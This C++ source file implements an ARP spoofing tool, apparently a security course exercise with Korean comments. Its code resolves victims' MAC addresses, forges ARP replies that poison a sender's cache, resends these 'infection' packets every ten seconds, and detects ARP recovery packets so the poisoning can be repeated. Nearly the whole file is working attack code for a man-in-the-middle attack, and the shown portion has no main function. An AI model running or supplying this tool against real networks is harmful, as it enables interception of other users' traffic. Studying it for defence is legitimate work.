#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "ethhdr.h"
#include <iostream>
#include <time.h>   


Mac bcast = Mac("ff:ff:ff:ff:ff:ff");
Mac unknown = Mac("00:00:00:00:00:00");
Mac memac;
Ip meip;

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct my_ipv4_hdr
{
    u_int8_t  ip_v_hl;       /* version, header length */
    u_int8_t  ip_tos;       /* type of service */
    u_int16_t ip_len;         /* total length */
    u_int16_t ip_id;          /* identification */
    u_int16_t ip_off;
    u_int8_t  ip_ttl;          /* time to live */
    u_int8_t  ip_p;            /* protocol */
    u_int16_t ip_sum;         /* checksum */
    struct in_addr ip_src;
    struct in_addr ip_dst; /* source and dest address */
};

struct EthIpPacket final {
    EthHdr eth_;
    my_ipv4_hdr iph_;
};

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


/* 디바이스 이름을 입력받아 맥주소를 가져오는 함수*/
Mac GetInterfaceMacAddress(const char *ifname)
{
    uint8_t *mac_addr; struct ifreq ifr; int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        perror("sockfd");
        exit;
    }
    
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);  
    if (ret < 0) {
      perror("ioctl");
      close(sockfd);
      exit;
    }
    mac_addr = (uint8_t *)(ifr.ifr_hwaddr.sa_data); 
    close(sockfd);

    return Mac(mac_addr);
}

/* 디바이스 이름을 입력받아 ip주소를 가져오는 함수*/
Ip GetInterfaceIPAddress(const char *ifname)
{
    char ip_addr[40];   struct ifreq ifr;   int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        perror("sockfd");
        exit;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0) {
      perror("ioctl");
      close(sockfd);
      exit;
    }
    close(sockfd);
    
    inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2,ip_addr,sizeof(struct sockaddr));
    return Ip(ip_addr);
}

/*EthArpPacket패킷을 만드는 함수*/
EthArpPacket make_EApacket(Mac ethdmac, Mac ethsmac, int op, Mac arpsmac, Ip arpsip, Mac arptmac, Ip arptip)
{
    EthArpPacket packet; 
    packet.eth_.dmac_= ethdmac;
	packet.eth_.smac_ = ethsmac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = arpsmac;
	packet.arp_.sip_ = htonl(arpsip);
	packet.arp_.tmac_ = arptmac;
	packet.arp_.tip_ = htonl(arptip);
    return packet;
}

/*ARP헤더 정보가 내가 받아야 하는 reply 패킷의 정보와 일치하는지 확인하는 함수*/
bool chk_ARPHdr(EthHdr *ethhdr, ArpHdr *arphdr,int op, Ip sip, Mac tmac, Ip tip) {
	if(ntohs(ethhdr->type_)!=0x0806)	return false;   //arp패킷이 아닌 경우
    if(arphdr->op()!= op || arphdr->sip_!= htonl(sip) || arphdr->tmac_ != tmac || arphdr->tip_!= htonl(tip))  
        {   
            return false;   //arp패킷이지만 정보가 일치하지 않는 경우
        }
    return true;
}

/*ip를 입력받아 맥 주소를 반환하는 함수*/
Mac resolve_MacAddress(pcap_t *handler, Ip resolve_ip){

    EthArpPacket EApacket;

    EApacket = make_EApacket(bcast,memac,1,memac,meip,unknown,resolve_ip);
	if(pcap_sendpacket(handler, reinterpret_cast<const u_char*>(&EApacket), sizeof(EthArpPacket))!=0){
		perror("pcap_sendpacket");
        exit(-1);
	}

    while (true) {
		struct pcap_pkthdr* header;	
		const u_char* packet;		
		int res = pcap_next_ex(handler, &header, &packet);	
		if (res == 0) continue;	//timeout
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {	
			perror("pcap_next_ex");
		}

		struct EthHdr *ethhdr = (struct EthHdr *) (packet);
		struct ArpHdr *arphdr = (struct ArpHdr *)(ethhdr +1);
		
		if(chk_ARPHdr(ethhdr,arphdr,2,resolve_ip,memac,meip)){
			return arphdr->smac_;
		}
	}
}

/*handler로 arp_infection_packet를 전달하는 함수*/
int send_arp_infection_packet(pcap_t *handler, Ip targetip, Mac sendermac, Ip senderip, int flow){

    EthArpPacket EApacket;
	EApacket = make_EApacket(sendermac,memac,2,memac,targetip,sendermac,senderip);
    if(pcap_sendpacket(handler, reinterpret_cast<const u_char*>(&EApacket), sizeof(EthArpPacket))!=0){
		perror("pcap_sendpacket");
		return -1;
	}

	printf("[%d] Attack packet sended!\n\n",flow);
    return 0;
}

/*send_arp_infection패킷의 스레드를 위한 함수*/
int send_arp_infection_packet_thread(const char* dev, Ip targetip, Mac sendermac,Ip senderip, int flow) {
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handler = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handler == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    while (true) {
        send_arp_infection_packet(handler,targetip,sendermac,senderip,flow);
        sleep(10);  //10초 마다 infection_pkt를 전송
    }
    pcap_close(handler);
}

/*패킷을 전달받아 recovring packet인지 여부를 반환하는 함수*/
bool is_recovering(const u_char *packet, Mac sendermac, Mac targetmac, Ip targetip){

	struct EthHdr *ethhdr = (struct EthHdr *) (packet);
	struct ArpHdr *arphdr = (struct ArpHdr *)(ethhdr +1);

    //1.sender가 target의 주소를 물어보는 arp request를 보내는 경우
    if(arphdr->smac_ == sendermac && ntohs(arphdr->op_) == ArpHdr::Request && arphdr->tip_==targetip)  return true;  
    //2.target이 broad cast로 arp패킷을 보내는 경우
    if(arphdr->smac_ == targetmac && arphdr->tmac_ == bcast)  return true;  
    
    return false;
}





